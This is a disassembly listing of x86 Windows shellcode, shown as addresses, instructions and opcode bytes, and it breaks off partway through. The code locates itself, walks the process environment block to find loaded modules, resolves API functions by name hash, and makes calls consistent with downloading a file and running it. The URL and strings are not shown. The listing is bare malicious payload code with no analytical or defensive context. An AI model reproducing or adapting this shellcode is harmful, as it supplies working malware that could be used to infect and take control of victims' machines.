
0x0 call 5                                   e800000000                      
	 label_0x5:
0x5 pop edx                                  5a                              
0x6 lea edx, [edx - 5]                       8d52fb                          
0x9 push edx                                 52                              
0xa mov ebx, 0x4b1ffe8e                      bb8efe1f4b                      
0xf call 0xc3                                e8af000000                      
0x14 pop edx                                  5a                              
0x15 push ebp                                 55                              
0x16 push edx                                 52                              
0x17 mov ebp, eax                             89c5                            
0x19 lea esi, [edx + 0x193]                   8db293010000                    
0x1f lea edi, [edx + 0x1af]                   8dbaaf010000                    
0x25 call 0xf9                                e8cf000000                      
0x2a pop edx                                  5a                              
0x2b pop ebp                                  5d                              
0x2c push ebp                                 55                              
0x2d push edx                                 52                              
0x2e lea eax, [edx + 0x1d3]                   8d82d3010000                    
0x34 push eax                                 50                              
0x35 call dword ptr [edx + 0x1bb]             ff92bb010000                    
0x3b pop edx                                  5a                              
0x3c pop ebp                                  5d                              
0x3d push ebp                                 55                              
0x3e push edx                                 52                              
0x3f mov ebp, eax                             89c5                            
0x41 lea esi, [edx + 0x1c7]                   8db2c7010000                    
0x47 lea edi, [edx + 0x1cf]                   8dbacf010000                    
0x4d call 0xf9                                e8a7000000                      
0x52 pop edx                                  5a                              
0x53 pop ebp                                  5d                              
0x54 push ebp                                 55                              
0x55 push edx                                 52                              
0x56 xor eax, eax                             31c0                            
0x58 lea esi, [edx + 0x1f2]                   8db2f2010000                    
0x5e lea edi, [edx + 0x214]                   8dba14020000                    
0x64 push eax                                 50                              
0x65 push eax                                 50                              
0x66 push edi                                 57                              
0x67 push esi                                 56                              
0x68 push eax                                 50                              
0x69 push dword ptr [edx + 0x1cf]             ffb2cf010000                    
0x6f pop eax                                  58                              
0x70 call eax                                 ffd0                            
0x72 pop edx                                  5a                              
0x73 pop ebp                                  5d                              
0x74 xor ecx, ecx                             31c9                            
0x76 cmp ecx, eax                             39c1                            
0x78 jne 0xb2                                 7538                            

0x7a push ebp                                 55                              
0x7b push edx                                 52                              
0x7c call 0x17a                               e8f9000000                      
0x81 pop edx                                  5a                              
0x82 pop ebp                                  5d                              
0x83 push ebp                                 55                              
0x84 push edx                                 52                              
0x85 call 0x15e                               e8d4000000                      
0x8a pop edx                                  5a                              
0x8b pop ebp                                  5d                              
0x8c push ebp                                 55                              
0x8d push edx                                 52                              
0x8e push 0x3000                              6800300000                      
0x93 push dword ptr [edx + 0x1bf]             ffb2bf010000                    
0x99 pop eax                                  58                              
0x9a call eax                                 ffd0                            
0x9c pop edx                                  5a                              
0x9d pop ebp                                  5d                              
0x9e push ebp                                 55                              
0x9f push edx                                 52                              
0xa0 lea edi, [edx + 0x214]                   8dba14020000                    
0xa6 push edi                                 57                              
0xa7 push dword ptr [edx + 0x1b3]             ffb2b3010000                    
0xad pop eax                                  58                              
0xae call eax                                 ffd0                            
0xb0 pop edx                                  5a                              
0xb1 pop ebp                                  5d                              
	 label_0xb2:
0xb2 push ebp                                 55                              
0xb3 push edx                                 52                              
0xb4 xor eax, eax                             31c0                            
0xb6 inc eax                                  40                              
0xb7 push eax                                 50                              
0xb8 push dword ptr [edx + 0x1b7]             ffb2b7010000                    
0xbe pop eax                                  58                              
0xbf call eax                                 ffd0                            
0xc1 pop edx                                  5a                              
0xc2 pop ebp                                  5d                              
	 label_0xc3:
0xc3 cld                                      fc                              
0xc4 xor edi, edi                             31ff                            
0xc6 mov edi, dword ptr fs:[0x30]             648b3d30000000                  
0xcd mov edi, dword ptr [edi + 0xc]           8b7f0c                          
0xd0 mov edi, dword ptr [edi + 0x14]          8b7f14                          
	 label_0xd3:
0xd3 mov esi, dword ptr [edi + 0x28]          8b7728                          
0xd6 xor edx, edx                             31d2                            
	 label_0xd8:
0xd8 lodsw ax, word ptr [esi]                 66ad                            
0xda test al, al                              84c0                            
0xdc je 0xef                                  7411                            

0xde cmp al, 0x41                             3c41                            
0xe0 jb 0xe8                                  7206                            

0xe2 cmp al, 0x5a                             3c5a                            
0xe4 ja 0xe8                                  7702                            

0xe6 or al, 0x20                              0c20                            
	 label_0xe8:
0xe8 rol edx, 7                               c1c207                          
0xeb xor dl, al                               30c2                            
0xed jmp 0xd8                                 ebe9                            

	 label_0xef:
0xef cmp edx, ebx                             39da                            
0xf1 mov eax, dword ptr [edi + 0x10]          8b4710                          
